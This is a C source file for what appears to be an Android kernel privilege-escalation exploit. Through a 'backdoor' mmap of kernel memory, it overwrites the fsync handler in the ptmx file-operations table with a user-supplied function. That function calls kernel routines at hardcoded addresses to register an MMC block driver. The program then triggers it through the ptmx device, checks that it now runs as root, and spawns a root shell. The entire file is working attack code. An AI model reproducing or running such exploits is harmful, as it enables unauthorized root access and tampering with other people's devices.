#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/system_properties.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "ptmx.h"
#include "backdoor_mmap.h"

int (*register_blkdev)(int, const char *) = (void *)0xc033a9e0;
int (*mmc_register_driver)(void *) = (void *)0xc05573b0;
void (*unregister_blkdev)(int, const char *) = (void *)0xc033a608;

void *mmc_driver_address = (void *)0xc0bf086c;

static int mmc_blk_init(void)
{
  int res;

  res = register_blkdev(179, "mmc");
  if (res)
    return res;

  res = mmc_register_driver(mmc_driver_address);
  if (res) {
    unregister_blkdev(179, "mmc");
    return res;
  }

  return 0;
}

void
load_msmsdcc(void)
{
  mmc_blk_init();
}

static bool
run_load_msmsdcc(void *user_data)
{
  int fd;

  fd = open(PTMX_DEVICE, O_WRONLY);
  fsync(fd);
  close(fd);

  return true;
}

static bool
run_exploit(void)
{
  void **ptmx_fsync_address;
  unsigned long int ptmx_fops_address;
  int fd;
  bool ret;

  ptmx_fops_address = get_ptmx_fops_address();
  if (!ptmx_fops_address) {
    return false;
  }

  if (!backdoor_open_mmap()) {
    printf("Failed to mmap due to %s.\n", strerror(errno));
    printf("Run 'install_backdoor' first\n");

    return false;
  }

  ptmx_fsync_address = backdoor_convert_to_mmaped_address((void *)ptmx_fops_address + 0x38);
  *ptmx_fsync_address = load_msmsdcc;

  ret = run_load_msmsdcc(NULL);

  *ptmx_fsync_address = NULL;

  backdoor_close_mmap();
  return ret;
}

int
main(int argc, char **argv)
{
  run_exploit();

  if (getuid() != 0) {
    printf("Failed to obtain root privilege.\n");
    exit(EXIT_FAILURE);
  }

  system("/system/bin/sh");

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
